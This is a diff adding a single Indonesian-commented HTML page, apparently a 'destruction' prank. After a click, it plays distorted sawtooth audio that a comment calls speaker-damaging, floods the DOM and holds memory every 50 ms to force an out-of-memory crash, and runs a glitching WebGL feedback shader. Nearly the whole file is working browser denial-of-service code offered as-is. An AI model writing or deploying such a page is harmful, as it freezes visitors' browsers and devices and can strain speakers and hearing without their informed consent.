@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>ENTROPI TERMINAL // OOM_EXCEPTION</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100vw; height: 100vh; background: #000; overflow: hidden; cursor: none; }
+        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; filter: contrast(200%) saturate(300%); }
+        #heap-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; pointer-events: none; mix-blend-mode: exclusion; }
+        .leak-node { position: absolute; color: #fff; font-family: monospace; font-size: 14px; font-weight: bold; text-shadow: 0 0 5px red; }
+        #trigger { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; padding: 20px 40px; font-family: monospace; font-size: 24px; font-weight: bold; background: #f00; color: #fff; border: none; cursor: pointer; text-transform: uppercase; }
+        #trigger:hover { background: #fff; color: #f00; }
+    </style>
+</head>
+<body>
+
+    <button id="trigger">EKSEKUSI KEHANCURAN</button>
+    <canvas id="glcanvas"></canvas>
+    <div id="heap-container"></div>
+
+    <script>
+        const trigger = document.getElementById('trigger');
+        const canvas = document.getElementById('glcanvas');
+        const heapContainer = document.getElementById('heap-container');
+        const gl = canvas.getContext('webgl', { preserveDrawingBuffer: true });
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        let audioCtx, osc, gainNode;
+        const memoryLeakArray = []; // Mencegah Garbage Collection
+
+        trigger.addEventListener('click', () => {
+            trigger.style.display = 'none';
+            initAudio();
+            initShader();
+            startMemoryLeak();
+        });
+
+        // 1. Audio Destruktif (Clipping & Distorsi Konstan)
+        function initAudio() {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            osc = audioCtx.createOscillator();
+            gainNode = audioCtx.createGain();
+            
+            // WaveShaper untuk distorsi absolut
+            const distortion = audioCtx.createWaveShaper();
+            function makeDistortionCurve(amount) {
+                let k = typeof amount === 'number' ? amount : 50;
+                let n_samples = 44100;
+                let curve = new Float32Array(n_samples);
+                let deg = Math.PI / 180;
+                for (let i = 0; i < n_samples; ++i ) {
+                    let x = i * 2 / n_samples - 1;
+                    curve[i] = ( 3 + k ) * x * 20 * deg / ( Math.PI + k * Math.abs(x) );
+                }
+                return curve;
+            }
+            distortion.curve = makeDistortionCurve(400);
+            distortion.oversample = '4x';
+
+            osc.type = 'sawtooth';
+            osc.frequency.value = 30; // Sub-bass yang merusak speaker
+            
+            gainNode.gain.value = 0.5;
+
+            osc.connect(distortion);
+            distortion.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+            osc.start();
+
+            // Mutasi frekuensi acak
+            setInterval(() => {
+                osc.frequency.setTargetAtTime(Math.random() * 1000 + 10, audioCtx.currentTime, 0.1);
+            }, 100);
+        }
+
+        // 2. Eksploitasi Tumpukan Memori (Memory Leak)
+        function startMemoryLeak() {
+            const strings = ["FATAL", "OVERFLOW", "NULL", "0x0000", "CORE_DUMP", "ENTROPY"];
+            
+            setInterval(() => {
+                // Banjiri DOM tanpa henti
+                for(let i = 0; i < 50; i++) {
+                    const el = document.createElement('div');
+                    el.className = 'leak-node';
+                    el.innerText = strings[Math.floor(Math.random() * strings.length)];
+                    el.style.left = `${Math.random() * 100}vw`;
+                    el.style.top = `${Math.random() * 100}vh`;
+                    el.style.transform = `scale(${Math.random() * 5})`;
+                    heapContainer.appendChild(el);
+                    
+                    // Simpan referensi ke array global agar memori tidak pernah dibebaskan
+                    memoryLeakArray.push({
+                        element: el,
+                        data: new Array(1000).fill(Math.random()) // Alokasi array tidak berguna untuk mempercepat OOM
+                    });
+                }
+
+                // Guncangan layar
+                document.body.style.transform = `translate(${Math.random()*10 - 5}px, ${Math.random()*10 - 5}px)`;
+            }, 50); // Dieksekusi setiap 50ms, eksponensial memakan RAM
+        }
+
+        // 3. WebGL Feedback Loop (Layar Melumer)
+        function initShader() {
+            const vsSource = `
+                attribute vec2 position;
+                void main() { gl_Position = vec4(position, 0.0, 1.0); }
+            `;
+
+            // Fragment shader mengeksploitasi buffer frame sebelumnya untuk menciptakan pola korupsi
+            const fsSource = `
+                precision highp float;
+                uniform vec2 u_resolution;
+                uniform float u_time;
+                uniform sampler2D u_buffer; // Tekstur frame sebelumnya
+
+                float random(vec2 st) {
+                    return fract(sin(dot(st.xy, vec2(12.9898,78.233))) * 43758.5453123);
+                }
+
+                void main() {
+                    vec2 uv = gl_FragCoord.xy / u_resolution.xy;
+                    
+                    // Distorsi vektor umpan balik
+                    vec2 offset = vec2(
+                        sin(uv.y * 50.0 + u_time) * 0.005,
+                        cos(uv.x * 50.0 - u_time) * 0.005
+                    );
+                    
+                    // Sampling frame sebelumnya dengan offset, zoom perlahan ke dalam
+                    vec2 prevUv = (uv - 0.5) * 0.99 + 0.5 + offset;
+                    vec4 prevColor = texture2D(u_buffer, prevUv);
+                    
+                    // Injeksi warna baru berdasarkan kebisingan (noise) dan waktu
+                    vec3 newColor = vec3(
+                        random(uv + u_time),
+                        random(uv - u_time),
+                        random(uv * u_time)
+                    );
+                    
+                    // Campurkan frame lama dan baru dengan rotasi rona (hue)
+                    vec3 finalColor = mix(prevColor.gbr, newColor, 0.05);
+                    
+                    // Korupsi warna acak
+                    if (random(uv + u_time * 2.0) > 0.99) {
+                        finalColor = vec3(1.0, 0.0, 0.0);
+                    }
+
+                    gl_FragColor = vec4(finalColor, 1.0);
+                }
+            `;
+
+            function createShader(type, source) {
+                const shader = gl.createShader(type);
+                gl.shaderSource(shader, source);
+                gl.compileShader(shader);
+                return shader;
+            }
+
+            const program = gl.createProgram();
+            gl.attachShader(program, createShader(gl.VERTEX_SHADER, vsSource));
+            gl.attachShader(program, createShader(gl.FRAGMENT_SHADER, fsSource));
+            gl.linkProgram(program);
+            gl.useProgram(program);
+
+            const posBuffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, posBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, -1,1, 1,-1, 1,1]), gl.STATIC_DRAW);
+            
+            const posLoc = gl.getAttribLocation(program, "position");
+            gl.enableVertexAttribArray(posLoc);
+            gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+
+            const resLoc = gl.getUniformLocation(program, "u_resolution");
+            const timeLoc = gl.getUniformLocation(program, "u_time");
+            const bufferLoc = gl.getUniformLocation(program, "u_buffer");
+
+            // Framebuffer setup untuk membaca frame sebelumnya
+            const texture = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, texture);
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, canvas.width, canvas.height, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+
+            // Inisialisasi tekstur kosong untuk dibaca
+            gl.copyTexImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 0, 0, canvas.width, canvas.height, 0);
+
+            function render(time) {
+                gl.viewport(0, 0, canvas.width, canvas.height);
+                
+                // Set uniforms
+                gl.uniform2f(resLoc, canvas.width, canvas.height);
+                gl.uniform1f(timeLoc, time * 0.001);
+                gl.uniform1i(bufferLoc, 0);
+
+                // Ikat tekstur (berisi frame sebelumnya)
+                gl.activeTexture(gl.TEXTURE0);
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+
+                // Gambar
+                gl.drawArrays(gl.TRIANGLES, 0, 6);
+
+                // Salin hasil render saat ini ke dalam tekstur untuk iterasi berikutnya
+                gl.copyTexImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 0, 0, canvas.width, canvas.height, 0);
+
+                requestAnimationFrame(render);
+            }
+
+            requestAnimationFrame(render);
+        }
+    </script>
+</body>
+</html>
